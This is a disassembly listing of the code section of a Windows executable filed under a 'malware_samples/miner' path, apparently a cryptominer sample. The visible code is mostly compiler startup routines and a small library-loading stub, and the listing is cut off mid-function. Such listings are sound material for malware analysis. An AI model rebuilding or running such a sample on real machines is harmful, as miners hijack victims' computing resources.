
malware_samples/miner/7c61c7a6a5e2bcef2ab0a8bd1b29d035cdb74ad5bbc878de1b6ee45ac2127b9c.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140001000 <.text>:
   140001000:	c3                   	ret
   140001001:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   140001008:	00 00 00 00 
   14000100c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001010:	48 83 ec 28          	sub    $0x28,%rsp
   140001014:	48 8b 05 a5 35 00 00 	mov    0x35a5(%rip),%rax        # 0x1400045c0
   14000101b:	31 c9                	xor    %ecx,%ecx
   14000101d:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001023:	48 8b 05 a6 35 00 00 	mov    0x35a6(%rip),%rax        # 0x1400045d0
   14000102a:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001030:	48 8b 05 a9 35 00 00 	mov    0x35a9(%rip),%rax        # 0x1400045e0
   140001037:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000103d:	48 8b 05 6c 35 00 00 	mov    0x356c(%rip),%rax        # 0x1400045b0
   140001044:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   14000104a:	48 8b 05 4f 34 00 00 	mov    0x344f(%rip),%rax        # 0x1400044a0
   140001051:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140001056:	75 0f                	jne    0x140001067
   140001058:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   14000105c:	48 01 d0             	add    %rdx,%rax
   14000105f:	81 38 50 45 00 00    	cmpl   $0x4550,(%rax)
   140001065:	74 69                	je     0x1400010d0
   140001067:	48 8b 05 32 35 00 00 	mov    0x3532(%rip),%rax        # 0x1400045a0
   14000106e:	89 0d 98 5f 00 00    	mov    %ecx,0x5f98(%rip)        # 0x14000700c
   140001074:	8b 00                	mov    (%rax),%eax
   140001076:	85 c0                	test   %eax,%eax
   140001078:	75 46                	jne    0x1400010c0
   14000107a:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000107f:	e8 6c 1a 00 00       	call   0x140002af0
   140001084:	e8 37 1a 00 00       	call   0x140002ac0
   140001089:	48 8b 15 d0 34 00 00 	mov    0x34d0(%rip),%rdx        # 0x140004560
   140001090:	8b 12                	mov    (%rdx),%edx
   140001092:	89 10                	mov    %edx,(%rax)
   140001094:	e8 1f 1a 00 00       	call   0x140002ab8
   140001099:	48 8b 15 a0 34 00 00 	mov    0x34a0(%rip),%rdx        # 0x140004540
   1400010a0:	8b 12                	mov    (%rdx),%edx
   1400010a2:	89 10                	mov    %edx,(%rax)
   1400010a4:	e8 57 09 00 00       	call   0x140001a00
   1400010a9:	48 8b 05 a0 33 00 00 	mov    0x33a0(%rip),%rax        # 0x140004450
   1400010b0:	83 38 01             	cmpl   $0x1,(%rax)
   1400010b3:	74 53                	je     0x140001108
   1400010b5:	31 c0                	xor    %eax,%eax
   1400010b7:	48 83 c4 28          	add    $0x28,%rsp
   1400010bb:	c3                   	ret
   1400010bc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010c0:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400010c5:	e8 26 1a 00 00       	call   0x140002af0
   1400010ca:	eb b8                	jmp    0x140001084
   1400010cc:	0f 1f 40 00          	nopl   0x0(%rax)
   1400010d0:	0f b7 50 18          	movzwl 0x18(%rax),%edx
   1400010d4:	66 81 fa 0b 01       	cmp    $0x10b,%dx
   1400010d9:	74 45                	je     0x140001120
   1400010db:	66 81 fa 0b 02       	cmp    $0x20b,%dx
   1400010e0:	75 85                	jne    0x140001067
   1400010e2:	83 b8 84 00 00 00 0e 	cmpl   $0xe,0x84(%rax)
   1400010e9:	0f 86 78 ff ff ff    	jbe    0x140001067
   1400010ef:	8b 90 f8 00 00 00    	mov    0xf8(%rax),%edx
   1400010f5:	31 c9                	xor    %ecx,%ecx
   1400010f7:	85 d2                	test   %edx,%edx
   1400010f9:	0f 95 c1             	setne  %cl
   1400010fc:	e9 66 ff ff ff       	jmp    0x140001067
   140001101:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001108:	48 8d 0d f1 07 00 00 	lea    0x7f1(%rip),%rcx        # 0x140001900
   14000110f:	e8 dc 0e 00 00       	call   0x140001ff0
   140001114:	31 c0                	xor    %eax,%eax
   140001116:	48 83 c4 28          	add    $0x28,%rsp
   14000111a:	c3                   	ret
   14000111b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001120:	83 78 74 0e          	cmpl   $0xe,0x74(%rax)
   140001124:	0f 86 3d ff ff ff    	jbe    0x140001067
   14000112a:	44 8b 80 e8 00 00 00 	mov    0xe8(%rax),%r8d
   140001131:	31 c9                	xor    %ecx,%ecx
   140001133:	45 85 c0             	test   %r8d,%r8d
   140001136:	0f 95 c1             	setne  %cl
   140001139:	e9 29 ff ff ff       	jmp    0x140001067
   14000113e:	66 90                	xchg   %ax,%ax
   140001140:	48 83 ec 38          	sub    $0x38,%rsp
   140001144:	48 8b 05 45 34 00 00 	mov    0x3445(%rip),%rax        # 0x140004590
   14000114b:	4c 8d 05 c6 5e 00 00 	lea    0x5ec6(%rip),%r8        # 0x140007018
   140001152:	48 8d 15 c7 5e 00 00 	lea    0x5ec7(%rip),%rdx        # 0x140007020
   140001159:	48 8d 0d c8 5e 00 00 	lea    0x5ec8(%rip),%rcx        # 0x140007028
   140001160:	8b 00                	mov    (%rax),%eax
   140001162:	89 05 9c 5e 00 00    	mov    %eax,0x5e9c(%rip)        # 0x140007004
   140001168:	48 8d 05 95 5e 00 00 	lea    0x5e95(%rip),%rax        # 0x140007004
   14000116f:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001174:	48 8b 05 d5 33 00 00 	mov    0x33d5(%rip),%rax        # 0x140004550
   14000117b:	44 8b 08             	mov    (%rax),%r9d
   14000117e:	e8 8d 17 00 00       	call   0x140002910
   140001183:	90                   	nop
   140001184:	48 83 c4 38          	add    $0x38,%rsp
   140001188:	c3                   	ret
   140001189:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   140001190:	41 55                	push   %r13
   140001192:	41 54                	push   %r12
   140001194:	55                   	push   %rbp
   140001195:	57                   	push   %rdi
   140001196:	56                   	push   %rsi
   140001197:	53                   	push   %rbx
   140001198:	48 81 ec 98 00 00 00 	sub    $0x98,%rsp
   14000119f:	48 8b 35 fa 33 00 00 	mov    0x33fa(%rip),%rsi        # 0x1400045a0
   1400011a6:	b9 0d 00 00 00       	mov    $0xd,%ecx
   1400011ab:	31 c0                	xor    %eax,%eax
   1400011ad:	44 8b 0e             	mov    (%rsi),%r9d
   1400011b0:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400011b5:	4c 89 c7             	mov    %r8,%rdi
   1400011b8:	f3 48 ab             	rep stos %rax,(%rdi)
   1400011bb:	45 85 c9             	test   %r9d,%r9d
   1400011be:	0f 85 dc 02 00 00    	jne    0x1400014a0
   1400011c4:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   1400011cb:	00 00 
   1400011cd:	48 8b 1d 0c 33 00 00 	mov    0x330c(%rip),%rbx        # 0x1400044e0
   1400011d4:	48 8b 78 08          	mov    0x8(%rax),%rdi
   1400011d8:	31 ed                	xor    %ebp,%ebp
   1400011da:	4c 8b 25 87 71 00 00 	mov    0x7187(%rip),%r12        # 0x140008368
   1400011e1:	eb 16                	jmp    0x1400011f9
   1400011e3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400011e8:	48 39 c7             	cmp    %rax,%rdi
   1400011eb:	0f 84 4f 02 00 00    	je     0x140001440
   1400011f1:	b9 e8 03 00 00       	mov    $0x3e8,%ecx
   1400011f6:	41 ff d4             	call   *%r12
   1400011f9:	48 89 e8             	mov    %rbp,%rax
   1400011fc:	f0 48 0f b1 3b       	lock cmpxchg %rdi,(%rbx)
   140001201:	48 85 c0             	test   %rax,%rax
   140001204:	75 e2                	jne    0x1400011e8
   140001206:	48 8b 3d e3 32 00 00 	mov    0x32e3(%rip),%rdi        # 0x1400044f0
   14000120d:	31 ed                	xor    %ebp,%ebp
   14000120f:	8b 07                	mov    (%rdi),%eax
   140001211:	83 f8 01             	cmp    $0x1,%eax
   140001214:	0f 84 3d 02 00 00    	je     0x140001457
   14000121a:	8b 07                	mov    (%rdi),%eax
   14000121c:	85 c0                	test   %eax,%eax
   14000121e:	0f 84 ac 02 00 00    	je     0x1400014d0
   140001224:	c7 05 da 5d 00 00 01 	movl   $0x1,0x5dda(%rip)        # 0x140007008
   14000122b:	00 00 00 
   14000122e:	8b 07                	mov    (%rdi),%eax
   140001230:	83 f8 01             	cmp    $0x1,%eax
   140001233:	0f 84 33 02 00 00    	je     0x14000146c
   140001239:	85 ed                	test   %ebp,%ebp
   14000123b:	0f 84 4c 02 00 00    	je     0x14000148d
   140001241:	48 8b 05 48 32 00 00 	mov    0x3248(%rip),%rax        # 0x140004490
   140001248:	48 8b 00             	mov    (%rax),%rax
   14000124b:	48 85 c0             	test   %rax,%rax
   14000124e:	74 0c                	je     0x14000125c
   140001250:	45 31 c0             	xor    %r8d,%r8d
   140001253:	ba 02 00 00 00       	mov    $0x2,%edx
   140001258:	31 c9                	xor    %ecx,%ecx
   14000125a:	ff d0                	call   *%rax
   14000125c:	e8 4f 0a 00 00       	call   0x140001cb0
   140001261:	48 8d 0d 98 0d 00 00 	lea    0xd98(%rip),%rcx        # 0x140002000
   140001268:	ff 15 f2 70 00 00    	call   *0x70f2(%rip)        # 0x140008360
   14000126e:	48 8b 15 5b 32 00 00 	mov    0x325b(%rip),%rdx        # 0x1400044d0
   140001275:	48 8d 0d 84 fd ff ff 	lea    -0x27c(%rip),%rcx        # 0x140001000
   14000127c:	48 89 02             	mov    %rax,(%rdx)
   14000127f:	e8 cc 18 00 00       	call   0x140002b50
   140001284:	e8 87 07 00 00       	call   0x140001a10
   140001289:	48 8b 05 10 32 00 00 	mov    0x3210(%rip),%rax        # 0x1400044a0
   140001290:	48 89 05 f1 5e 00 00 	mov    %rax,0x5ef1(%rip)        # 0x140007188
   140001297:	e8 74 18 00 00       	call   0x140002b10
   14000129c:	31 c9                	xor    %ecx,%ecx
   14000129e:	48 8b 00             	mov    (%rax),%rax
   1400012a1:	48 85 c0             	test   %rax,%rax
   1400012a4:	75 1d                	jne    0x1400012c3
   1400012a6:	eb 60                	jmp    0x140001308
   1400012a8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400012af:	00 
   1400012b0:	66 85 d2             	test   %dx,%dx
   1400012b3:	74 2b                	je     0x1400012e0
   1400012b5:	83 e1 01             	and    $0x1,%ecx
   1400012b8:	74 26                	je     0x1400012e0
   1400012ba:	b9 01 00 00 00       	mov    $0x1,%ecx
   1400012bf:	48 83 c0 02          	add    $0x2,%rax
   1400012c3:	0f b7 10             	movzwl (%rax),%edx
   1400012c6:	66 83 fa 20          	cmp    $0x20,%dx
   1400012ca:	76 e4                	jbe    0x1400012b0
   1400012cc:	41 89 c8             	mov    %ecx,%r8d
   1400012cf:	41 83 f0 01          	xor    $0x1,%r8d
   1400012d3:	66 83 fa 22          	cmp    $0x22,%dx
   1400012d7:	41 0f 44 c8          	cmove  %r8d,%ecx
   1400012db:	eb e2                	jmp    0x1400012bf
   1400012dd:	0f 1f 00             	nopl   (%rax)
   1400012e0:	83 ea 01             	sub    $0x1,%edx
   1400012e3:	66 83 fa 1f          	cmp    $0x1f,%dx
   1400012e7:	77 18                	ja     0x140001301
   1400012e9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400012f0:	0f b7 58 02          	movzwl 0x2(%rax),%ebx
   1400012f4:	48 83 c0 02          	add    $0x2,%rax
   1400012f8:	8d 53 ff             	lea    -0x1(%rbx),%edx
   1400012fb:	66 83 fa 1f          	cmp    $0x1f,%dx
   1400012ff:	76 ef                	jbe    0x1400012f0
   140001301:	48 89 05 78 5e 00 00 	mov    %rax,0x5e78(%rip)        # 0x140007180
   140001308:	44 8b 06             	mov    (%rsi),%r8d
   14000130b:	45 85 c0             	test   %r8d,%r8d
   14000130e:	74 16                	je     0x140001326
   140001310:	b8 0a 00 00 00       	mov    $0xa,%eax
   140001315:	f6 44 24 5c 01       	testb  $0x1,0x5c(%rsp)
   14000131a:	0f 85 10 01 00 00    	jne    0x140001430
   140001320:	89 05 da 1c 00 00    	mov    %eax,0x1cda(%rip)        # 0x140003000
   140001326:	8b 1d fc 5c 00 00    	mov    0x5cfc(%rip),%ebx        # 0x140007028
   14000132c:	44 8d 6b 01          	lea    0x1(%rbx),%r13d
   140001330:	4d 63 ed             	movslq %r13d,%r13
   140001333:	49 c1 e5 03          	shl    $0x3,%r13
   140001337:	4c 89 e9             	mov    %r13,%rcx
   14000133a:	e8 79 18 00 00       	call   0x140002bb8
   14000133f:	48 8b 3d da 5c 00 00 	mov    0x5cda(%rip),%rdi        # 0x140007020
   140001346:	48 89 c5             	mov    %rax,%rbp
   140001349:	85 db                	test   %ebx,%ebx
   14000134b:	7e 78                	jle    0x1400013c5
   14000134d:	31 f6                	xor    %esi,%esi
   14000134f:	44 8d 63 ff          	lea    -0x1(%rbx),%r12d
   140001353:	48 8b 04 f7          	mov    (%rdi,%rsi,8),%rax
   140001357:	66 83 38 00          	cmpw   $0x0,(%rax)
   14000135b:	74 56                	je     0x1400013b3
   14000135d:	0f 1f 00             	nopl   (%rax)
   140001360:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001366:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   14000136d:	00 00 00 
   140001370:	49 83 c0 01          	add    $0x1,%r8
   140001374:	66 42 83 7c 40 fe 00 	cmpw   $0x0,-0x2(%rax,%r8,2)
   14000137b:	75 f3                	jne    0x140001370
   14000137d:	4b 8d 1c 00          	lea    (%r8,%r8,1),%rbx
   140001381:	48 89 d9             	mov    %rbx,%rcx
   140001384:	e8 2f 18 00 00       	call   0x140002bb8
   140001389:	49 89 d8             	mov    %rbx,%r8
   14000138c:	48 89 44 f5 00       	mov    %rax,0x0(%rbp,%rsi,8)
   140001391:	48 8b 14 f7          	mov    (%rdi,%rsi,8),%rdx
   140001395:	48 89 c1             	mov    %rax,%rcx
   140001398:	e8 db 17 00 00       	call   0x140002b78
   14000139d:	48 8d 46 01          	lea    0x1(%rsi),%rax
   1400013a1:	49 39 f4             	cmp    %rsi,%r12
   1400013a4:	74 1a                	je     0x1400013c0
   1400013a6:	48 89 c6             	mov    %rax,%rsi
   1400013a9:	48 8b 04 f7          	mov    (%rdi,%rsi,8),%rax
   1400013ad:	66 83 38 00          	cmpw   $0x0,(%rax)
   1400013b1:	75 ad                	jne    0x140001360
   1400013b3:	bb 02 00 00 00       	mov    $0x2,%ebx
   1400013b8:	eb c7                	jmp    0x140001381
   1400013ba:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400013c0:	4a 8d 44 2d f8       	lea    -0x8(%rbp,%r13,1),%rax
   1400013c5:	48 c7 00 00 00 00 00 	movq   $0x0,(%rax)
   1400013cc:	48 89 2d 4d 5c 00 00 	mov    %rbp,0x5c4d(%rip)        # 0x140007020
   1400013d3:	e8 28 04 00 00       	call   0x140001800
   1400013d8:	48 8b 05 d1 30 00 00 	mov    0x30d1(%rip),%rax        # 0x1400044b0
   1400013df:	4c 8b 05 32 5c 00 00 	mov    0x5c32(%rip),%r8        # 0x140007018
   1400013e6:	8b 0d 3c 5c 00 00    	mov    0x5c3c(%rip),%ecx        # 0x140007028
   1400013ec:	48 8b 00             	mov    (%rax),%rax
   1400013ef:	4c 89 00             	mov    %r8,(%rax)
   1400013f2:	48 8b 15 27 5c 00 00 	mov    0x5c27(%rip),%rdx        # 0x140007020
   1400013f9:	e8 d2 01 00 00       	call   0x1400015d0
   1400013fe:	8b 0d 08 5c 00 00    	mov    0x5c08(%rip),%ecx        # 0x14000700c
   140001404:	89 05 06 5c 00 00    	mov    %eax,0x5c06(%rip)        # 0x140007010
   14000140a:	85 c9                	test   %ecx,%ecx
   14000140c:	0f 84 dc 00 00 00    	je     0x1400014ee
   140001412:	8b 15 f0 5b 00 00    	mov    0x5bf0(%rip),%edx        # 0x140007008
   140001418:	85 d2                	test   %edx,%edx
   14000141a:	0f 84 90 00 00 00    	je     0x1400014b0
   140001420:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   140001427:	5b                   	pop    %rbx
   140001428:	5e                   	pop    %rsi
   140001429:	5f                   	pop    %rdi
   14000142a:	5d                   	pop    %rbp
   14000142b:	41 5c                	pop    %r12
   14000142d:	41 5d                	pop    %r13
   14000142f:	c3                   	ret
   140001430:	0f b7 44 24 60       	movzwl 0x60(%rsp),%eax
   140001435:	e9 e6 fe ff ff       	jmp    0x140001320
   14000143a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140001440:	48 8b 3d a9 30 00 00 	mov    0x30a9(%rip),%rdi        # 0x1400044f0
   140001447:	bd 01 00 00 00       	mov    $0x1,%ebp
   14000144c:	8b 07                	mov    (%rdi),%eax
   14000144e:	83 f8 01             	cmp    $0x1,%eax
   140001451:	0f 85 c3 fd ff ff    	jne    0x14000121a
   140001457:	b9 1f 00 00 00       	mov    $0x1f,%ecx
   14000145c:	e8 4f 15 00 00       	call   0x1400029b0
   140001461:	8b 07                	mov    (%rdi),%eax
   140001463:	83 f8 01             	cmp    $0x1,%eax
   140001466:	0f 85 cd fd ff ff    	jne    0x140001239
   14000146c:	48 8b 15 9d 30 00 00 	mov    0x309d(%rip),%rdx        # 0x140004510
   140001473:	48 8b 0d 86 30 00 00 	mov    0x3086(%rip),%rcx        # 0x140004500
   14000147a:	e8 c9 16 00 00       	call   0x140002b48
   14000147f:	c7 07 02 00 00 00    	movl   $0x2,(%rdi)
   140001485:	85 ed                	test   %ebp,%ebp
   140001487:	0f 85 b4 fd ff ff    	jne    0x140001241
   14000148d:	31 c0                	xor    %eax,%eax
   14000148f:	48 87 03             	xchg   %rax,(%rbx)
   140001492:	e9 aa fd ff ff       	jmp    0x140001241
   140001497:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000149e:	00 00 
   1400014a0:	4c 89 c1             	mov    %r8,%rcx
   1400014a3:	ff 15 8f 6e 00 00    	call   *0x6e8f(%rip)        # 0x140008338
   1400014a9:	e9 16 fd ff ff       	jmp    0x1400011c4
   1400014ae:	66 90                	xchg   %ax,%ax
   1400014b0:	e8 63 16 00 00       	call   0x140002b18
   1400014b5:	8b 05 55 5b 00 00    	mov    0x5b55(%rip),%eax        # 0x140007010
   1400014bb:	48 81 c4 98 00 00 00 	add    $0x98,%rsp
   1400014c2:	5b                   	pop    %rbx
   1400014c3:	5e                   	pop    %rsi
   1400014c4:	5f                   	pop    %rdi
   1400014c5:	5d                   	pop    %rbp
   1400014c6:	41 5c                	pop    %r12
   1400014c8:	41 5d                	pop    %r13
   1400014ca:	c3                   	ret
   1400014cb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400014d0:	48 8b 15 59 30 00 00 	mov    0x3059(%rip),%rdx        # 0x140004530
   1400014d7:	48 8b 0d 42 30 00 00 	mov    0x3042(%rip),%rcx        # 0x140004520
   1400014de:	c7 07 01 00 00 00    	movl   $0x1,(%rdi)
   1400014e4:	e8 5f 16 00 00       	call   0x140002b48
   1400014e9:	e9 40 fd ff ff       	jmp    0x14000122e
   1400014ee:	89 c1                	mov    %eax,%ecx
   1400014f0:	e8 6b 16 00 00       	call   0x140002b60
   1400014f5:	90                   	nop
   1400014f6:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   1400014fd:	00 00 00 
   140001500:	48 83 ec 28          	sub    $0x28,%rsp
   140001504:	48 8b 05 95 30 00 00 	mov    0x3095(%rip),%rax        # 0x1400045a0
   14000150b:	c7 00 01 00 00 00    	movl   $0x1,(%rax)
   140001511:	e8 7a fc ff ff       	call   0x140001190
   140001516:	90                   	nop
   140001517:	90                   	nop
   140001518:	48 83 c4 28          	add    $0x28,%rsp
   14000151c:	c3                   	ret
   14000151d:	0f 1f 00             	nopl   (%rax)
   140001520:	48 83 ec 28          	sub    $0x28,%rsp
   140001524:	48 8b 05 75 30 00 00 	mov    0x3075(%rip),%rax        # 0x1400045a0
   14000152b:	c7 00 00 00 00 00    	movl   $0x0,(%rax)
   140001531:	e8 5a fc ff ff       	call   0x140001190
   140001536:	90                   	nop
   140001537:	90                   	nop
   140001538:	48 83 c4 28          	add    $0x28,%rsp
   14000153c:	c3                   	ret
   14000153d:	0f 1f 00             	nopl   (%rax)
   140001540:	48 83 ec 28          	sub    $0x28,%rsp
   140001544:	e8 37 14 00 00       	call   0x140002980
   140001549:	48 85 c0             	test   %rax,%rax
   14000154c:	0f 94 c0             	sete   %al
   14000154f:	0f b6 c0             	movzbl %al,%eax
   140001552:	f7 d8                	neg    %eax
   140001554:	48 83 c4 28          	add    $0x28,%rsp
   140001558:	c3                   	ret
   140001559:	90                   	nop
   14000155a:	90                   	nop
   14000155b:	90                   	nop
   14000155c:	90                   	nop
   14000155d:	90                   	nop
   14000155e:	90                   	nop
   14000155f:	90                   	nop
   140001560:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x140001570
   140001567:	e9 d4 ff ff ff       	jmp    0x140001540
   14000156c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001570:	c3                   	ret
   140001571:	90                   	nop
   140001572:	90                   	nop
   140001573:	90                   	nop
   140001574:	90                   	nop
   140001575:	90                   	nop
   140001576:	90                   	nop
   140001577:	90                   	nop
   140001578:	90                   	nop
   140001579:	90                   	nop
   14000157a:	90                   	nop
   14000157b:	90                   	nop
   14000157c:	90                   	nop
   14000157d:	90                   	nop
   14000157e:	90                   	nop
   14000157f:	90                   	nop
   140001580:	48 83 ec 48          	sub    $0x48,%rsp
   140001584:	41 b8 00 10 00 00    	mov    $0x1000,%r8d
   14000158a:	48 8d 44 24 68       	lea    0x68(%rsp),%rax
   14000158f:	4c 89 4c 24 68       	mov    %r9,0x68(%rsp)
   140001594:	48 89 ca             	mov    %rcx,%rdx
   140001597:	4c 8d 0d 62 2a 00 00 	lea    0x2a62(%rip),%r9        # 0x140004000
   14000159e:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400015a3:	b9 04 00 00 00       	mov    $0x4,%ecx
   1400015a8:	48 c7 44 24 20 00 00 	movq   $0x0,0x20(%rsp)
   1400015af:	00 00 
   1400015b1:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1400015b6:	e8 1d 15 00 00       	call   0x140002ad8
   1400015bb:	ba ff ff ff ff       	mov    $0xffffffff,%edx
   1400015c0:	85 c0                	test   %eax,%eax
   1400015c2:	0f 48 c2             	cmovs  %edx,%eax
   1400015c5:	48 83 c4 48          	add    $0x48,%rsp
   1400015c9:	c3                   	ret
   1400015ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   1400015d0:	41 57                	push   %r15
   1400015d2:	b8 38 20 00 00       	mov    $0x2038,%eax
   1400015d7:	41 56                	push   %r14
   1400015d9:	41 55                	push   %r13
   1400015db:	41 54                	push   %r12
   1400015dd:	57                   	push   %rdi
   1400015de:	53                   	push   %rbx
   1400015df:	e8 0c 12 00 00       	call   0x1400027f0
   1400015e4:	48 29 c4             	sub    %rax,%rsp
   1400015e7:	31 c0                	xor    %eax,%eax
   1400015e9:	48 8b 1d 88 6d 00 00 	mov    0x6d88(%rip),%rbx        # 0x140008378
   1400015f0:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   1400015f6:	41 89 ce             	mov    %ecx,%r14d
   1400015f9:	48 8d 7c 24 30       	lea    0x30(%rsp),%rdi
   1400015fe:	b9 23 00 00 00       	mov    $0x23,%ecx
   140001603:	49 89 d5             	mov    %rdx,%r13
   140001606:	f3 48 ab             	rep stos %rax,(%rdi)
   140001609:	48 8b 05 18 2b 00 00 	mov    0x2b18(%rip),%rax        # 0x140004128
   140001610:	ba 02 00 00 00       	mov    $0x2,%edx
   140001615:	4c 8d 7c 24 30       	lea    0x30(%rsp),%r15
   14000161a:	c7 07 00 00 00 00    	movl   $0x0,(%rdi)
   140001620:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140001625:	ff d3                	call   *%rbx
   140001627:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000162d:	ba 01 00 00 00       	mov    $0x1,%edx
   140001632:	48 89 c1             	mov    %rax,%rcx
   140001635:	ff d3                	call   *%rbx
   140001637:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   14000163d:	ba 20 00 00 00       	mov    $0x20,%edx
   140001642:	48 89 c1             	mov    %rax,%rcx
   140001645:	ff d3                	call   *%rbx
   140001647:	ba 23 00 00 00       	mov    $0x23,%edx
   14000164c:	4c 89 f9             	mov    %r15,%rcx
   14000164f:	49 89 c0             	mov    %rax,%r8
   140001652:	ff 15 28 6d 00 00    	call   *0x6d28(%rip)        # 0x140008380
   140001658:	41 89 c4             	mov    %eax,%r12d
   14000165b:	85 c0                	test   %eax,%eax
   14000165d:	0f 84 bd 00 00 00    	je     0x140001720
   140001663:	49 8b 4d 00          	mov    0x0(%r13),%rcx
   140001667:	e8 3c 14 00 00       	call   0x140002aa8
   14000166c:	48 89 c1             	mov    %rax,%rcx
   14000166f:	48 89 c3             	mov    %rax,%rbx
   140001672:	e8 29 14 00 00       	call   0x140002aa0
   140001677:	48 8d 04 43          	lea    (%rbx,%rax,2),%rax
   14000167b:	eb 1a                	jmp    0x140001697
   14000167d:	0f 1f 00             	nopl   (%rax)
   140001680:	0f b7 10             	movzwl (%rax),%edx
   140001683:	66 83 fa 5c          	cmp    $0x5c,%dx
   140001687:	0f 84 b3 00 00 00    	je     0x140001740
   14000168d:	66 83 fa 2f          	cmp    $0x2f,%dx
   140001691:	0f 84 a9 00 00 00    	je     0x140001740
   140001697:	48 83 e8 02          	sub    $0x2,%rax
   14000169b:	48 39 c3             	cmp    %rax,%rbx
   14000169e:	75 e0                	jne    0x140001680
   1400016a0:	48 8d 1d 81 29 00 00 	lea    0x2981(%rip),%rbx        # 0x140004028
   1400016a7:	48 8d 05 20 2a 00 00 	lea    0x2a20(%rip),%rax        # 0x1400040ce
   1400016ae:	49 89 d9             	mov    %rbx,%r9
   1400016b1:	ba 00 10 00 00       	mov    $0x1000,%edx
   1400016b6:	4c 89 f9             	mov    %r15,%rcx
   1400016b9:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   1400016be:	48 8d 05 17 2a 00 00 	lea    0x2a17(%rip),%rax        # 0x1400040dc
   1400016c5:	4c 8d 05 34 29 00 00 	lea    0x2934(%rip),%r8        # 0x140004000
   1400016cc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400016d1:	e8 aa fe ff ff       	call   0x140001580
   1400016d6:	4c 89 f9             	mov    %r15,%rcx
   1400016d9:	ff 15 79 6c 00 00    	call   *0x6c79(%rip)        # 0x140008358
   1400016df:	48 8d 0d 0a 2a 00 00 	lea    0x2a0a(%rip),%rcx        # 0x1400040f0
   1400016e6:	ff 15 64 6c 00 00    	call   *0x6c64(%rip)        # 0x140008350
   1400016ec:	48 8d 15 1f 2a 00 00 	lea    0x2a1f(%rip),%rdx        # 0x140004112
   1400016f3:	48 89 c1             	mov    %rax,%rcx
   1400016f6:	ff 15 34 6c 00 00    	call   *0x6c34(%rip)        # 0x140008330
   1400016fc:	4c 89 ea             	mov    %r13,%rdx
   1400016ff:	44 89 f1             	mov    %r14d,%ecx
   140001702:	ff d0                	call   *%rax
   140001704:	41 89 c4             	mov    %eax,%r12d
   140001707:	44 89 e0             	mov    %r12d,%eax
   14000170a:	48 81 c4 38 20 00 00 	add    $0x2038,%rsp
   140001711:	5b                   	pop    %rbx
   140001712:	5f                   	pop    %rdi
   140001713:	41 5c                	pop    %r12
   140001715:	41 5d                	pop    %r13
   140001717:	41 5e                	pop    %r14
   140001719:	41 5f                	pop    %r15
   14000171b:	c3                   	ret
   14000171c:	0f 1f 40 00          	nopl   0x0(%rax)
   140001720:	45 31 c9             	xor    %r9d,%r9d
   140001723:	4c 8d 05 06 29 00 00 	lea    0x2906(%rip),%r8        # 0x140004030
   14000172a:	48 8d 15 2f 29 00 00 	lea    0x292f(%rip),%rdx        # 0x140004060
   140001731:	31 c9                	xor    %ecx,%ecx
   140001733:	ff 15 f7 6d 00 00    	call   *0x6df7(%rip)        # 0x140008530
   140001739:	eb cc                	jmp    0x140001707
   14000173b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001740:	31 d2                	xor    %edx,%edx
   140001742:	66 89 10             	mov    %dx,(%rax)
   140001745:	e9 5d ff ff ff       	jmp    0x1400016a7
   14000174a:	90                   	nop
   14000174b:	90                   	nop
   14000174c:	90                   	nop
   14000174d:	90                   	nop
   14000174e:	90                   	nop
   14000174f:	90                   	nop
   140001750:	48 83 ec 28          	sub    $0x28,%rsp
   140001754:	48 8b 05 b5 18 00 00 	mov    0x18b5(%rip),%rax        # 0x140003010
   14000175b:	48 8b 00             	mov    (%rax),%rax
   14000175e:	48 85 c0             	test   %rax,%rax
   140001761:	74 22                	je     0x140001785
   140001763:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140001768:	ff d0                	call   *%rax
   14000176a:	48 8b 05 9f 18 00 00 	mov    0x189f(%rip),%rax        # 0x140003010
   140001771:	48 8d 50 08          	lea    0x8(%rax),%rdx
   140001775:	48 8b 40 08          	mov    0x8(%rax),%rax
   140001779:	48 89 15 90 18 00 00 	mov    %rdx,0x1890(%rip)        # 0x140003010
   140001780:	48 85 c0             	test   %rax,%rax
   140001783:	75 e3                	jne    0x140001768
